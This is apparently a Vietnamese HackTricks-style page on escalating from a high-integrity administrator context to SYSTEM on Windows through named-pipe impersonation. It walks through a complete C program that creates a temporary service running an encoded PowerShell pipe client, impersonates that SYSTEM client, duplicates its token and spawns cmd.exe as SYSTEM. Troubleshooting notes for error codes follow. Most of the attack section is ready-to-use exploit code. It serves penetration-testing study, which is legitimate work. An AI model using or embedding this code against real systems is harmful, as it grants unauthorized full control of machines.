# Từ High Integrity lên SYSTEM bằng Name Pipes

{{#include ../../banners/hacktricks-training.md}}

Đây là **biến thể administrator/SCM** của named-pipe impersonation: một process đã được nâng quyền tạo một service tạm thời, process con của service kết nối với tư cách `SYSTEM`, rồi impersonate client đó. Nếu context ban đầu không thể tạo service nhưng có `SeImpersonatePrivilege`, hãy dùng privileged-service coercion; xem [Named Pipe Client Impersonation](named-pipe-client-impersonation.md) và [RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato](roguepotato-and-printspoofer.md). Việc tạo service yêu cầu quyền truy cập SCM và quyền `SERVICE_START` đối với service mới, còn `CreateProcessWithTokenW` yêu cầu `SeImpersonatePrivilege`.<sup>[[2]](#references)[[3]](#references)</sup>

Nhanh chóng xác nhận context ban đầu dự kiến:

```cmd
whoami /groups | findstr /i "High Mandatory"
whoami /priv | findstr /i "SeImpersonatePrivilege"
sc.exe query PiperSrv
```

**Luồng code:**

1. Tạo named-pipe server **trước** khi khởi động service. Khi chờ, hãy coi `ConnectNamedPipe` trả về `FALSE` cùng với `ERROR_PIPE_CONNECTED` là thành công: điều đó có nghĩa client đã kết nối trong khoảng thời gian giữa `CreateNamedPipe` và `ConnectNamedPipe`.<sup>[[4]](#references)</sup>
2. Tạo và khởi động một service sẽ kết nối với pipe vừa tạo rồi ghi dữ liệu. Code của service sẽ thực thi đoạn PS đã mã hóa này: `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
3. Sau khi service kết nối và ghi dữ liệu, gọi `ImpersonateNamedPipeClient`, mở thread token thu được, rồi duplicate token đó thành primary token.<sup>[[1]](#references)</sup>
4. Dùng primary token đó để tạo tiến trình `cmd.exe`.<sup>[[2]](#references)</sup>

Cách này giả định caller có thể tạo/khởi động service và có các quyền cần thiết cho `CreateProcessWithTokenW` (thường là `SeImpersonatePrivilege`). Đây là kỹ thuật từ high-integrity lên SYSTEM, không phải primitive dành cho người dùng bất kỳ có đặc quyền thấp.<sup>[[2]](#references)[[3]](#references)</sup>

> [!WARNING]
> Nếu tạo/khởi động service thất bại, mẫu này không báo hiệu cho pipe thread và có thể chờ vô thời hạn. Hãy bổ sung xử lý lỗi và timeout cho overlapped pipe trước khi dùng ngoài môi trường lab. Đồng thời, hãy dùng tên pipe/service ngẫu nhiên để tránh xung đột.

`ImpersonateNamedPipeClient` áp dụng context gắn với **message cuối cùng được đọc**, vì vậy chỉ kết nối thôi là chưa đủ: hãy yêu cầu client có đặc quyền ghi dữ liệu, xác minh `ReadFile` trả về dữ liệu, rồi mới impersonate. Duplicate thread impersonation token thành token `TokenPrimary` với `SecurityImpersonation`; API tạo tiến trình sử dụng primary token.<sup>[[1]](#references)[[5]](#references)</sup>

```c
#include <windows.h>
#include <time.h>

#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")

#define PIPESRV "PiperSrv"
#define MESSAGE_SIZE 512

DWORD WINAPI ServiceGo(LPVOID lpParam) {

	SC_HANDLE scManager;
	SC_HANDLE scService;

	scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);

	if (scManager == NULL) {
		return FALSE;
	}

	// create Piper service
	scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
		SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
		"C:\\Windows\\System32\\cmd.exe /c powershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
		NULL, NULL, NULL, NULL, NULL);

	if (scService == NULL) {
		//printf("[!] CreateServiceA() failed: [%d]\n", GetLastError());
		return FALSE;
	}

	// launch it
	StartService(scService, 0, NULL);

	// wait a bit and then cleanup
	Sleep(10000);
	DeleteService(scService);

	CloseServiceHandle(scService);
	CloseServiceHandle(scManager);
}

int main() {

	LPCSTR sPipeName = "\\\\.\\pipe\\piper";
	HANDLE hSrvPipe;
	HANDLE th;
	BOOL bPipeConn;
	char pPipeBuf[MESSAGE_SIZE];
	DWORD dBRead = 0;

	HANDLE hImpToken;
	HANDLE hNewToken;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	// open pipe
	hSrvPipe = CreateNamedPipeA(sPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL);

	// create and run service
	th = CreateThread(0, 0, ServiceGo, NULL, 0, 0);

	// wait for the connection from the service
	bPipeConn = ConnectNamedPipe(hSrvPipe, NULL);
	if (!bPipeConn && GetLastError() == ERROR_PIPE_CONNECTED) {
		bPipeConn = TRUE; // Client connected between CreateNamedPipe and ConnectNamedPipe
	}
	if (bPipeConn) {
		if (!ReadFile(hSrvPipe, &pPipeBuf, MESSAGE_SIZE, &dBRead, NULL) || dBRead == 0) {
			return -6;
		}

		// impersonate the service (SYSTEM)
		if (ImpersonateNamedPipeClient(hSrvPipe) == 0) {
			return -1;
		}

		// wait for the service to cleanup
		WaitForSingleObject(th, INFINITE);

		// get a handle to impersonated token
		if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hImpToken)) {
			return -2;
		}

		// create new primary token for new process
		if (!DuplicateTokenEx(hImpToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
			TokenPrimary, &hNewToken)) {
			return -4;
		}

		//Sleep(20000);
		// spawn cmd.exe as full SYSTEM user
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));
		if (!CreateProcessWithTokenW(hNewToken, 0, L"C:\\Windows\\System32\\cmd.exe", NULL,
			CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
			return -5;
		}

		// revert back to original security context
		RevertToSelf();

	}

	return 0;
}
```

### Chẩn đoán lỗi

- `ConnectNamedPipe == FALSE` với `ERROR_PIPE_CONNECTED`: tiếp tục; pipe đã được kết nối.<sup>[[4]](#references)</sup>
- `ImpersonateNamedPipeClient` thất bại với `ERROR_CANNOT_IMPERSONATE` (`1368`): xác nhận client SYSTEM thực sự đã ghi dữ liệu và `ReadFile` đã hoàn tất. Đồng thời kiểm tra mức impersonation mà client yêu cầu; client ở mức identification/anonymous không thể bị impersonate hoàn toàn.<sup>[[1]](#references)</sup>
- `CreateProcessWithTokenW` thất bại với `ERROR_PRIVILEGE_NOT_HELD` (`1314`): caller ban đầu không có `SeImpersonatePrivilege`. Trong ngữ cảnh administrator có integrity cao, hãy dùng cách sao chép token được mô tả trong [SeImpersonate from High To System](seimpersonate-from-high-to-system.md), hoặc dùng `CreateProcessAsUserW` khi đang impersonate SYSTEM nếu có các privilege cần thiết.<sup>[[2]](#references)</sup>
- `CreateServiceA` trả về `ERROR_SERVICE_EXISTS` (`1073`): xóa mục `PiperSrv` cũ hoặc tạo tên ngẫu nhiên cho `PIPESRV`; luôn xóa service tạm sau khi trigger.<sup>[[3]](#references)</sup>



## References

- [1] [Microsoft Learn — `ImpersonateNamedPipeClient`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [Microsoft Learn — `CreateProcessWithTokenW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [3] [Microsoft Learn — `CreateServiceA`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
- [4] [Microsoft Learn — `ConnectNamedPipe`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe)
- [5] [Microsoft Learn — `DuplicateTokenEx`](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)
{{#include ../../banners/hacktricks-training.md}}
